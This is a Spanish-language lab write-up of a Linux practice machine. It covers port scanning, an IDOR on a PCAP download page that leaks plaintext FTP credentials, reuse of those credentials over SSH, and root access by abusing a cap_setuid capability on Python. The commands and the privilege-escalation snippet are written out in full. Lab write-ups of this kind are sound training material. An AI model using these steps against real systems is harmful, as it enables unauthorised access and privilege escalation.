## Información de la máquina

- **SO**: Linux
- **Dificultad**: Fácil (para mí a 1 de Junio media)
- **IP usada**: 10.129.11.159
- Fecha: [[2026-06-01]]
## Enumeración (Reconocimiento)
### Escaneo de la red
#### Comandos utilizados

```bash
nmap -sS -T5 -p- -Pn 10.129.11.159 -vvv
nmap -sV -p21,22,80 10.129.11.159
```

| **Puerto** | **Servicio** | **Versión**   | **Estado** |
| ---------- | ------------ | ------------- | ---------- |
| 21         | FTP          | vsftpd 3.0.3  | Abierto    |
| 22         | SSH          | OpenSSH 8.2p1 | Abierto    |
| 80         | HTTP         | Gunicorn      | Abierto    |
Gunicorn es un servidor python web.

## Análisis del servicio web
La pantalla principal da a un Dashboard bastante simple que cuenta con un menú lateral y un perfil de usuario que no redirige a nada.
![[Pasted image 20260601221726.png]]
Encontramos una página interesante, la cuál es "Security Snapshot", que cuenta con un botón "Download", el cuál nos permite descargar Snapshots PCAP. La URL de esta página es http://IP_Servidor/data/X, donde X es el ID.
![[Pasted image 20260601221952.png]]
## Análisis de vulnerabilidades
Cambiando el ID a 0 y descargando la snapshot vemos información confidencial no encriptada en el contenido del fichero usando el comando strings:
```shell
(λ) cat 0.pcap                                        Downloads
─────┬──────────────────────────────────────────────────────────
     │ File: 0.pcap   <BINARY>
─────┴──────────────────────────────────────────────────────────
(λ) strings 0.pcap                                    Downloads
EErP
EErP
GET / HTTP/1.1
Host: 192.168.196.16
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1
Pragma: no-cache
Cache-Control: no-cache
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 1240
Server: Werkzeug/2.0.0 Python/3.8.5
Date: Fri, 14 May 2021 13:12:49 GMT
<!doctype html>
<html lang="en">
	<head>
		<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-+0n0xVW2eSR5OomGNYDnhzAbDsOXxcvSN1TPprVMTNDbiYZCxYbOOl7+AMvyTG2x" crossorigin="anonymous">
		<link href="https://bootswatch.com/5/darkly/bootstrap.css" rel="stylesheet">
		<link href="/static/main.css" rel="stylesheet">
	</head>
	<body class="text-center">
		<h1 class="h3 mb-3 font-weight-normal">Please Enter PCAP to be analyzed</h1>
		<form action="/upload" method="POST" enctype="multipart/form-data">
			<label for="formFile" class="form-label">PCAP To Be Analzyed</label>
			<input name="file" class="btn custom-form-cap form-control" type="file" id="formFile">
			<input name="submit" type="submit" value="Submit">
			<!--<button class="btn btn-lg btn-primary btn-block" type="submit">Submit</button>-->
		</form>
	</body>
	<footer>
		<p style="bottom: 0%; position: fixed; width: 100%;" class="mt-5 mb-3 text-muted">&copy; 2021</p>
	</footer>
	<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.bundle.min.js" integrity="sha384-gtEjrD/SeCtmISkJkNUaaKMoLD0//ElJ19smozuHV6z3Iehds+3Ulb9Bn9Plx0x4" crossorigin="anonymous"></script>
</html>Qw
GET /static/main.css HTTP/1.1
Host: 192.168.196.16
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0
Accept: text/css,*/*;q=0.1
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://192.168.196.16/
DNT: 1
Sec-GPC: 1
Pragma: no-cache
Cache-Control: no-cache
HTTP/1.0 200 OK
Content-Disposition: inline; filename=main.css
Content-Type: text/css; charset=utf-8
Content-Length: 736
Last-Modified: Fri, 14 May 2021 11:33:53 GMT
Cache-Control: no-cache
Date: Fri, 14 May 2021 13:12:50 GMT
Server: Werkzeug/2.0.0 Python/3.8.5
.custom-form-cap {
    color: #fff !important;
    background-color: #222 !important;
table.center {
  margin-left: auto !important; 
  margin-right: auto !important;
.form-signin {
  width: 100%;
  max-width: 330px;
  padding: 15px;
  margin: 0 auto;
.form-signin .checkbox {
  font-weight: 400;
.form-signin .form-control {
  position: relative;
  box-sizing: border-box;
  height: auto;
  padding: 10px;
  font-size: 16px;
.form-signin .form-control:focus {
  z-index: 2;
.form-signin input[type="email"] {
  margin-bottom: -1px;
  border-bottom-right-radius: 0;
  border-bottom-left-radius: 0;
.form-signin input[type="password"] {
  margin-bottom: 10px;
  border-top-left-radius: 0;
  border-top-right-radius: 0;
Pz,1"
~07z,1#
Pz,1#
~08P
Pz,1#
~08P
GET /favicon.ico HTTP/1.1
Host: 192.168.196.16
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0
Accept: image/webp,*/*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://192.168.196.16/
DNT: 1
Sec-GPC: 1
Pragma: no-cache
Cache-Control: no-cache
~08z,2
~08z,2
HTTP/1.0 404 NOT FOUND
~0Pz,2
Content-Type: text/html; charset=utf-8
Content-Length: 232
Server: Werkzeug/2.0.0 Python/3.8.5
Date: Fri, 14 May 2021 13:12:50 GMT
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
Pz,2
Pz,2
<st@
220 (vsFTPd 3.0.3)
USER nathan
(su@
Jsv@
331 Please specify the password.
PASS Buck3tH4TF0RM3!
(sw@
?sx@
230 Login successful.
"]#P
SYST
(sy@
"]#`
;sz@
"]#`
215 UNIX Type: L8
"]6P
"]6P
PORT 192,168,196,1,212,140
(s{@
"]6`
[s|@
"]6`
200 PORT command successful. Consider using PASV.
"]iP
LIST
Os}@
"]i`
150 Here comes the directory listing.
@s~@
226 Directory send OK.
PORT 192,168,196,1,212,141
200 PORT command successful. Consider using PASV.
LIST -al
150 Here comes the directory listing.
226 Directory send OK.
TYPE I
200 Switching to Binary mode.
"^9P
PORT 192,168,196,1,212,143
"^9`
200 PORT command successful. Consider using PASV.
"^lP
RETR notes.txt
"^l`
550 Failed to open file.
QUIT
221 Goodbye.
```


## Explotación
Con esas claves no solo puedes conectarte a FTP:
```shell
ftp 10.129.11.159
Connected to 10.129.11.159.
220 (vsFTPd 3.0.3)
Name (10.129.11.159:julicc): nathan
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||7884|)
150 Here comes the directory listing.
-r--------    1 1001     1001           33 Jun 01 17:19 user.txt
226 Directory send OK.
ftp> cat user.txt
?Invalid command.
ftp> get user.txt
local: user.txt remote: user.txt
229 Entering Extended Passive Mode (|||15769|)
150 Opening BINARY mode data connection for user.txt (33 bytes).
100% |****************************************|    33        0.33 KiB/s    00:00 ETA
226 Transfer complete.
33 bytes received in 00:00 (0.15 KiB/s)
ftp> exit
221 Goodbye.
```
Sino que puedes acceder a la máquina remotamente mediante SSH con las mismas credenciales, lo que nos facilita enormemente la escalada de privilegios.
```shell
┌──(julicc㉿arceus)-[~]
└─$ ssh nathan@10.129.11.159
The authenticity of host '10.129.11.159 (10.129.11.159)' can't be established.
ED25519 key fingerprint is: SHA256:UDhIJpylePItP3qjtVVU+GnSyAZSr+mZKHzRoKcmLUI
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.11.159' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
nathan@10.129.11.159's password:
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Jun  1 20:00:35 UTC 2026

  System load:           0.0
  Usage of /:            36.8% of 8.73GB
  Memory usage:          21%
  Swap usage:            0%
  Processes:             225
  Users logged in:       0
  IPv4 address for eth0: 10.129.11.159
  IPv6 address for eth0: dead:beef::a0de:adff:fea3:f8b8

  => There are 3 zombie processes.


63 updates can be applied immediately.
42 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu May 27 11:21:27 2021 from 10.10.14.7
nathan@cap:~$
```
## Escalada de privilegios
Haciendo uso de la herramienta getcap la cual ya estaba instalada en el dispositivo podemos ver que binarios de la máquina tienen capacidades especiales que pueden abusarse para escalar privilegios:
```shell
nathan@cap:~$ getcap -r / 2>/dev/null
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

Con python podemos escalar privilegios de la siguiente forma:
```python
nathan@cap:~$ python3.8
Python 3.8.5 (default, Jan 27 2021, 15:41:15)
[GCC 9.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> os.setuid(0)
>>> os.system('whoami')
root
0
>>> os.system('bash')
root@cap:~#
```

## Remediación y Conclusiones